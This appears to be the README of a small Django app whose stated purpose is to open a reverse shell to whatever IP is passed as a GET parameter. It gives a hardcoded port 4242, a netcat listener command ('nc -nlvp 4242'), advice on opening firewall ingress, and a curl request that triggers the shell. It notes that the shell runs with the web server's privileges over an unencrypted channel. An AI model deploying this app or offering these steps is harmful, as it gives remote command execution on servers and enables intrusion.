# django-rev-shell

A simple Django app that returns a reverse shell to the IP that is passed as a GET parameter to index.

The TCP port the application tries to send the reverse shell is 4242 (hardcoded). Please update the code as required. A `netcat` listener on the receiving system can be started as `nc -nlvp 4242`. Make sure firewall rules allow ingress on this port (on AWS security groups for example).

Making an HTTP request to the Django app with the ip of the receiver sent as a parameter as shown below, will return a reverse shell. The shell runs with the same privileges as the web app server and the shell commands and response data is over an unencrypted channel.

## Usage

```
python3 index.py runserver
curl http://<server-where-app-is-deployed>/?ip=<ip-where-nc-is-listening>
```
